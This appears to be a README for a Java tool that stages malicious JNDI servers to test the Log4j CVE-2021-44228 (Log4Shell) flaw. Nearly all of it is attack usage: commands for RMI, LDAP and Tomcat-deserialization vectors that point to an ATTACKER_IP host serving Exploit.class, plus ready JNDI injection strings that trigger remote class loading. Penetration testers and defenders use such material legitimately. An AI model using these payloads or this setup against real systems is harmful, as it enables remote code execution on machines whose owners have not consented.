
# Log4j-JNDIServer

This project will help to test the Log4j CVE-2021-44228 vulnerability.

## Installation

- Load the project on Intellij Idea
- Build Project (CTRL + F9). This will create the jar file in /out folder

## Examples 

### 1.RMI Attack Vector

`java -jar Log4j-JNDIServer.jar 1 <RMI_IP> <RMI_PORT> Exploit http://<ATTACKER_IP>:<ATTACKER_PORT>`

and host the Exploit.class using python -m http.server

`Injection: {jndi:rmi://<RMI_IP>:<RMI_PORT>/Foo}`

### 2.LDAP Attack Vector

`java -jar Log4j-JNDIServer.jar 2 <LDAP_IP> <LDAP_PORT> http://<ATTACKER_IP>:<ATTACKER_PORT>/#Exploit`

and host the Exploit.class using python -m http.server

`Injection: {jndi:ldap://<LDAP_IP>:<LDAP_PORT>/Exploit}`

### 3.Deserialization Attack Vector (Using Tomcat payload)

`java -jar Log4j-JNDIServer.jar 3 <RMI_IP> <RMI_PORT>`

`Injection: {jndi:rmi://<RMI_IP>:<RMI_PORT>/Foo}`
